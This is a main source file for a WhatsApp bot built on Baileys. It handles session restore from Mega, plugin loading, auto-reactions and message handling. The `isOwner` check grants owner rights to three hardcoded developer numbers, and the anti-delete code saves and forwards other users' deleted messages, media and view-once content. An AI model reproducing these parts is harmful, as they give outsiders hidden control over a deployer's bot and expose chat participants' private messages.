
const {
    default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID, makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys')
const fs = require('fs')
const P = require('pino')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const NodeCache = require('node-cache')
const util = require('util')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, fetchBuffer, getFile } = require('./lib/functions')
const { sms, downloadMediaMessage } = require('./lib/msg')
const axios = require('axios')
const { File } = require('megajs')
const path = require('path')
const msgRetryCounterCache = new NodeCache()
const ownerNumber = [config.OWNER_NUMBER];
const l = console.log
var { updateCMDStore,isbtnID,getCMDStore,getCmdForCmdId,connectdb,input,get,updb,updfb } = require("./lib/database")
//===================SESSION============================
if (!fs.existsSync(__dirname + '/session/creds.json')) {
  if (config.SESSION_ID) {
  const sessdata = config.SESSION_ID.replace("KAVISHAN-MD~","")
  const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
  filer.download((err, data) => {
    if (err) throw err
    fs.writeFile(__dirname + '/session/creds.json', data, () => {
console.log("Session download completed !!")
    })
  })
}}
// <<==========PORTS===========>>
const express = require("express");
const app = express();
const port = process.env.PORT || 8000;
//====================================
async function connectToWA() {
  const { version, isLatest } = await fetchLatestBaileysVersion()
  console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/session/')
  const conn = makeWASocket({
    logger: P({ level: "fatal" }).child({ level: "fatal" }),
    printQRInTerminal: true,
    generateHighQualityLinkPreview: true,
    auth: state,
    defaultQueryTimeoutMs: undefined,
    msgRetryCounterCache 
  })
  
  conn.ev.on('connection.update',async(update) => {
    const { connection, lastDisconnect } = update
    if (connection === 'close') {
if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
  connectToWA()
}
    } else if (connection === 'open') {

console.log('Installing plugins 🔌... ')
const path = require('path');
fs.readdirSync("./plugins/").forEach((plugin) => {
  if (path.extname(plugin).toLowerCase() == ".js") {
    require("./plugins/" + plugin);
  }
});
console.log('Plugins installed ✅')
await connectdb()
await updb()
console.log('KAVISHAN-MD connected ✅')
async function acceptInvite() {
  try {
    await conn.groupAcceptInvite("DPZOsVCvsljJiVagfilmFN");
    console.log("Successfully joined the group.");
  } catch (error) {
    console.error("Error accepting group invite:", error);
  }
}
await conn.sendMessage(ownerNumber + "@s.whatsapp.net", { image: { url: `https://github.com/DARKMATTER-X-TM/DATABASE/blob/main/64lr8y68.jpg?raw=true` }, 'caption': "*DMX-MD CONNECTED ✅*\n\n_*This is made to be simple and easy for you to deploy. All the things here are made by kavishan_OFC & ruwa'h 🎉.*_\n\n*👨‍💻Join support -* *https://chat.whatsapp.com/DPZOsVCvsljJiVagfilmFN*\n\n*👨‍💻Follow updates chanal -* *https://whatsapp.com/channel/0029Vb05h8uK5cDEg7BNtR1i*\n\n*👨‍💻Beta test group -* *https://chat.whatsapp.com/LOVFkjfokdM6Bv1rI0QXn2*" });
 let up = `> ☉ Your currently settings ☉\n\n▫️ ANTI DELETE: ${config.ANTI_DELETE}\n\n▫ALWAYS ONLINE: ${config.ALWAYS_ONLINE}\n\n▫️ANTI CALL: ${config.ANTI_CALL}\n\n▫️AUTO BLOCK: ${config.AUTO_BLOCK}\n\n▫️ONLY GROUP: ${config.ONLY_GROUP}\n\n▫️ONLY ME: ${config.ONLY_ME}\n\n▫️AUTO RECORDING: ${config.AUTO_RECORDING}\n\n▫️STATUS VIEW: ${config.STATUS_VIEW}\n\n▫AUTO STATUS REPLY: ${config.AUTO_STATUS_REPLY}\n\n▫️AUTO TYPING: ${config.AUTO_TYPING}\n\n▫️AUTO VOICE: ${config.AUTO_VOICE}\n\n▫️AUTO BIO: ${config.AUTO_BIO}\n\n▫️OWNER REACT: ${config.OWNER_REACT}\n\n▫️AUTO REACT: ${config.AUTO_REACT}\n\n▫️AUTO READ CMD: ${config.AUTO_READ_CMD}\n\n▫AUTO READ MASSAGE: ${config.AUTO_READ}\n\n▫️ANTI BAD WORDS: ${config.ANTI_BAD}\n\n▫️ANTI BOT: ${config.ANTI_BOT}\n\n▫️ANTI LINK: ${config.ANTI_LINK}\n\n▫️ALIVE MASSAGE: ${config.ALIVE}\n\n▫️PREFIX: ${config.PREFIX}\n\n▫️FOOTERTEXT: ${config.FOOTER}\n\n▫️MAX SIZE: ${config.MAX_SIZE}\n\n▫️OWNER: ${config.OWNER_NUMBER}\n\n▫️LOGO: ${config.LOGO}\n\n> ☉ You can customize as you like ☉`
await conn.sendMessage(ownerNumber + "@s.whatsapp.net",{ 'text':up})
}
})

  conn.ev.on('creds.update', saveCreds)
conn.ev.on('messages.upsert', async (mek) => {
    try {
mek = mek.messages[0]
if (!mek.message) return
mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast'  && config.STATUS_VIEW){
      await conn.readMessages([mek.key])
    }        
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY){
  const user = mek.key.participant
  const text = `𝗗𝗠𝗫 𝗠𝗗 𝗛𝗔𝗦 𝗦𝗘𝗘𝗡 𝗬𝗢𝗨𝗥 𝗦𝗧𝗔𝗧𝗨𝗦`
  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
  }
//===========================================================================================================	    
 if (config.ALWAYS_ONLINE){
 await conn.sendPresenceUpdate('available', mek.key.remoteJid)
}else{
await conn.sendPresenceUpdate('unavailable', mek.key.remoteJid)
}
//===========================================================================================================
if(config.AUTO_TYPING){
conn.sendPresenceUpdate('composing', mek.key.remoteJid)
}
//==========================================================================================================
if(config.AUTO_RECORDING){
//await conn.sendPresenceUpdate('recording', mek.key.remoteJid)
conn.sendPresenceUpdate('recording', mek.key.remoteJid)
 }
//===========================================================================================================
if (config.AUTO_READ) {
  conn.readMessages([mek.key]);  // Mark message as re
		   }
//===========================================================================================================

if (config.AUTO_BIO){
await conn.updateProfileStatus(`𝗗𝗠𝗫 𝗠𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗙𝗨𝗟𝗟𝗬 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗𝗦➤ 𝗧𝗛𝗜𝗦 𝗗𝗘𝗩𝗜𝗖𝗘 𝗧𝗜 𝗛𝗔𝗩𝗘 𝗕𝗘𝗘𝗡 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 𝗙𝗢𝗥❤️👨‍💻`)
}
//===========================================================================================================

const prefix = config.PREFIX;
const m = sms(conn, mek)
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation') ? mek.message.conversation : mek.message?.extendedTextMessage?.contextInfo?.hasOwnProperty('quotedMessage') &&
await isbtnID(mek.message?.extendedTextMessage?.contextInfo?.stanzaId) &&
getCmdForCmdId(await getCMDStore(mek.message?.extendedTextMessage?.contextInfo?.stanzaId), mek?.message?.extendedTextMessage?.text)
? getCmdForCmdId(await getCMDStore(mek.message?.extendedTextMessage?.contextInfo?.stanzaId), mek?.message?.extendedTextMessage?.text)  : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const isGroup = from.endsWith('@g.us')
const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
const senderNumber = sender.split('@')[0]
const botNumber = conn.user.id.split(':')[0]
const pushname = mek.pushName || 'Sin Nombre'
const developers = '94788017991,94789474773,94763562850'
const isbot = botNumber.includes(senderNumber)
const isdev = developers.includes(senderNumber)
const isMe = isbot ? isbot : isdev 
const isOwner = ownerNumber.includes(senderNumber) || isMe
const botNumber2 = await jidNormalizedUser(conn.user.id);
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => { }) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const isReact = m.message.reactionMessage ? true : false
const isAnti = (teks) => {
let getdata = teks
for (let i=0;i<getdata.length;i++) {
if(getdata[i] === from) return true
}
return false
}

const reply = async(teks) => {
  return await conn.sendMessage(from, { text: teks }, { quoted: mek })
}
conn.replyad = async (teks) => {
  return await conn.sendMessage(from, { text: teks, contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363376339574797@newsletter',
      serverMessageId: 127
    }
}}, { quoted: mek })
}
const NON_BUTTON = true // Implement a switch to on/off this feature...
conn.buttonMessage2 = async (jid, msgData,quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n*${mainNumber} | ${button.buttonText.displayText}*\n`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text}\n\n▰▰▰▰▰▰▰▰▰▰▰▰
┃ *𝚁𝙴𝙿𝙻𝚈 𝙱𝙴𝙻𝙾𝚆 𝙽𝚄𝙼𝙱𝙴𝚁*
▰▰▰▰▰▰▰▰▰▰▰▰\n\n${result}\n\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage,contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363376339574797@newsletter',
      serverMessageId: 127
    }
}}, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n▰▰▰▰▰▰▰▰▰▰▰▰
┃ *𝚁𝙴𝙿𝙻𝚈 𝙱𝙴𝙻𝙾𝚆 𝙽𝚄𝙼𝙱𝙴𝚁*
▰▰▰▰▰▰▰▰▰▰▰▰\n\n${result}\n\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage,contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363376339574797@newsletter',
      serverMessageId: 127
    }
}}, { quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}

conn.buttonMessage = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n*${mainNumber} | ${button.buttonText.displayText}*\n`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text || msgData.caption}\n\n▰▰▰▰▰▰▰▰▰▰▰▰
┃ *𝚁𝙴𝙿𝙻𝚈 𝙱𝙴𝙻𝙾𝚆 𝙽𝚄𝙼𝙱𝙴𝚁*
▰▰▰▰▰▰▰▰▰▰▰▰\n\n${result}\n\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage,contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363376339574797@newsletter',
      serverMessageId: 127
    }
}}, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n▰▰▰▰▰▰▰▰▰▰▰▰
┃ *𝚁𝙴𝙿𝙻𝚈 𝙱𝙴𝙻𝙾𝚆 𝙽𝚄𝙼𝙱𝙴𝚁*
▰▰▰▰▰▰▰▰▰▰▰▰\n\n${result}\n\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage,contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363376339574797@newsletter',
      serverMessageId: 127
    }
}}, { quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}
conn.listMessage2 = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n*[${mainNumber}] ${section.title}*\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `   ${subNumber} | ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage,contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363376339574797@newsletter',
      serverMessageId: 127
    }
}}, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}

conn.listMessage = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n*[${mainNumber}] ${section.title}*\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `   ${subNumber} | ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage,contextInfo: {
    mentionedJid: [ '' ],
    groupMentions: [],
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '120363376339574797@newsletter',
      serverMessageId: 127
    }
}}, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}

conn.edite = async (gg, newmg) => {
  await conn.relayMessage(from, {
    protocolMessage: {
key: gg.key,
type: 14,
editedMessage: {
  conversation: newmg
}
    }
  }, {})
}
conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
            let vtype
            if (options.readViewOnce) {
                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                delete message.message.viewOnceMessage.message[vtype].viewOnce
                message.message = {
                    ...message.message.viewOnceMessage.message
                }
            }

            let mtype = Object.keys(message.message)[0]
            let content = await generateForwardMessageContent(message, forceForward)
            let ctype = Object.keys(content)[0]
            let context = {}
            if (mtype != "conversation") context = message.message[mtype].contextInfo
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo
            }
            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                ...content[ctype],
                ...options,
                ...(options.contextInfo ? {
                    contextInfo: {
                        ...content[ctype].contextInfo,
                        ...options.contextInfo
                    }
                } : {})
            } : {})
            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
            return waMessage
}
	    
  
  //================================================
	    
conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
  let mime = '';
  let res = await axios.head(url)
  mime = res.headers['content-type']
  if (mime.split("/")[1] === "gif") {
    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
  }
  let type = mime.split("/")[0] + "Message"
  if (mime === "application/pdf") {
    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "image") {
    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "video") {
    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "audio") {
    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
 }
}

if(!isOwner) {	
    if(config.ANTI_DELETE) {
    if (!m.id.startsWith("BAE5")) {
    
    // Ensure the base directory exists
    const baseDir = 'message_data';
    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir);
    }
    
    function loadChatData(remoteJid, messageId) {
      const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
      try {
        const data = fs.readFileSync(chatFilePath, 'utf8');
        return JSON.parse(data) || [];
      } catch (error) {
        return [];
      }
    }
    
    function saveChatData(remoteJid, messageId, chatData) {
      const chatDir = path.join(baseDir, remoteJid);
    
      if (!fs.existsSync(chatDir)) {
        fs.mkdirSync(chatDir, { recursive: true });
      }
    
      const chatFilePath = path.join(chatDir, `${messageId}.json`);
    
      try {
        fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
       // console.log('Chat data saved successfully.');
      } catch (error) {
        console.error('Error saving chat data:', error);
      }
    }
        
    function handleIncomingMessage(message) {
      const remoteJid = from //message.key.remoteJid;
      const messageId = message.key.id;
    
      const chatData = loadChatData(remoteJid, messageId);
    
      chatData.push(message);
    
      saveChatData(remoteJid, messageId, chatData);
    
    //  console.log('Message received and saved:', messageId);
    }
    
    
    const delfrom = config.OWNER_NUMBER !=='' ? config.OWNER_NUMBER +'@s.whatsapp.net': from
    function handleMessageRevocation(revocationMessage) {
    //const remoteJid = revocationMessage.message.protocolMessage.key.remoteJid;
     //const messageId = revocationMessage.message.protocolMessage.key.id;
    const remoteJid = from // revocationMessage.msg.key.remoteJid;
    const messageId = revocationMessage.msg.key.id;
    
        
     // console.log('Received revocation message with ID:', messageId);
    
      const chatData = loadChatData(remoteJid, messageId);
    
       const originalMessage = chatData[0]   
    
      if (originalMessage) {
        const deletedBy = revocationMessage.sender.split('@')[0];
        const sentBynn = originalMessage.key.participant ?? revocationMessage.sender;
    const sentBy = sentBynn.split('@')[0];
          if ( deletedBy.includes(botNumber) || sentBy.includes(botNumber) ) return;
     if(originalMessage.message && originalMessage.message.conversation && originalMessage.message.conversation !== ''){
         const messageText = originalMessage.message.conversation;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
         var xx = '```'
     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` });
    //........................................//........................................
    }else if(originalMessage.msg.type ==='MESSAGE_EDIT'){
     conn.sendMessage(delfrom, { text: `❌ *edited message detected* ${originalMessage.message.editedMessage.message.protocolMessage.editedMessage.conversation}` },{quoted: mek});
     
    //........................................//........................................
    } else if(originalMessage.message && originalMessage.message.exetendedTextMessage && originalMessage.msg.text ){ //&& originalMessage.message.exetendedTextMessage.text && originalMessage.message.exetendedTextMessage.text !== ''){
        const messageText = originalMessage.msg.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
    
     var xx = '```'
     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` });
    } else if(originalMessage.message && originalMessage.message.exetendedTextMessage ){ //&& originalMessage.message.exetendedTextMessage.text && originalMessage.message.exetendedTextMessage.text !== ''){
        const messagetext = originalMessage.message.extendedTextMessage.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
     var xx = '```'
     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.body}${xx}` });
    }else if(originalMessage.type === 'extendedTextMessage') {
    async function quotedMessageRetrive(){     
    var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                
    if(originalMessage.message.extendedTextMessage){
    const messagetext = originalMessage.message.extendedTextMessage.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
        var xx = '```'
     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage.text}${xx}` });
    }else{
    const messagetext = originalMessage.message.extendedTextMessage.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
        conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage.text}${xx}` });
    }
    }
    
    quotedMessageRetrive()
           
    }else if(originalMessage.type === 'imageMessage') {
          async function imageMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    if(originalMessage.message.imageMessage.caption){
    const messageText = originalMessage.message.imageMessage.caption;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
    
        await conn.sendMessage(delfrom, { image: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.imageMessage.caption}` })
    }else{
        await conn.sendMessage(delfrom, { image: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` })
    }       
        }
    imageMessageRetrive()
     
    }else if(originalMessage.type === 'videoMessage') {
          async function videoMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
    
    const vData = originalMessage.message.videoMessage.fileLength
    const vTime = originalMessage.message.videoMessage.seconds;
    const fileDataMB = config.MAX_SIZE
    const fileLengthBytes = vData
    const fileLengthMB = fileLengthBytes / (1024 * 1024);
    const fileseconds = vTime
    if(originalMessage.message.videoMessage.caption){
    if (fileLengthMB < fileDataMB && fileseconds < 30*60 ) {
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    const messageText = originalMessage.message.videoMessage.caption;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
    
        await conn.sendMessage(delfrom, { video: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.videoMessage.caption}` })
           }
    }else{
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
        const vData = originalMessage.message.videoMessage.fileLength
    const vTime = originalMessage.message.videoMessage.seconds;
    const fileDataMB = config.MAX_SIZE
    const fileLengthBytes = vData
    const fileLengthMB = fileLengthBytes / (1024 * 1024);
    const fileseconds = vTime
    if (fileLengthMB < fileDataMB && fileseconds < 30*60 ) {
        await conn.sendMessage(delfrom, { video: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` })
    }
    }       
    }
    videoMessageRetrive()
    }else if(originalMessage.type === 'documentMessage') {
          async function documentMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    
        
    
    if(originalMessage.message.documentWithCaptionMessage){
    
    await conn.sendMessage(delfrom, { document: fs.readFileSync("./" + type.ext), mimetype: originalMessage.message.documentMessage.mimetype, fileName: originalMessage.message.documentMessage.fileName, caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`});
     
    }else{
    
    await conn.sendMessage(delfrom, { document: fs.readFileSync("./" + type.ext), mimetype: originalMessage.message.documentMessage.mimetype, fileName: originalMessage.message.documentMessage.fileName, caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`});
    
    }
     }
    
    documentMessageRetrive()
    }else if(originalMessage.type === 'audioMessage') {
          async function audioMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    if(originalMessage.message.audioMessage){
    const audioq = await conn.sendMessage(delfrom, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: audioq});
    
    }else{
    if(originalMessage.message.audioMessage.ptt === "true"){
    
    const pttt = await conn.sendMessage(delfrom, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, ptt: 'true',fileName: `${m.id}.mp3` })	
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: pttt});
    
     }
      }
     }
    
    audioMessageRetrive()
    }else if(originalMessage.type === 'stickerMessage') {
          async function stickerMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    if(originalMessage.message.stickerMessage){
     
    //await conn.sendMessage(from, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
     const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'KAVISHAN-MD'})
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: sdata});
    
    }else{
    
    const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'KAVISHAN-MD'})
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: stdata});
    
      }
     }
    
    stickerMessageRetrive()
             }
         
      } else {
        console.log('Original message not found for revocation.');
      }
    }
    if(!isGroup){
    if (mek.msg && mek.msg.type === 0) {
      handleMessageRevocation(mek);
    } else {//if(mek.message && mek.message.conversation && mek.message.conversation !== ''){
      handleIncomingMessage(mek);
    
        }}
    
    }
    }	
    }
    
//==================================== developer react ================================================================
	    
if(senderNumber.includes("94789474773")){
if(isReact) return
m.react("👑")
}

if(senderNumber.includes("+94763562850")){
if(isReact) return
m.react("👑")
}
//================================= auto react ========================================================================
if (!isReact && senderNumber !== botNumber) {
    if (config.AUTO_REACT) {
        const reactions = ['❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', '🤗', '😌', '😉', '🤗', '😊', '🎊', '🎉', '🎁', '🎈', '👋'];

        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
        m.react(randomReaction);
    }
}

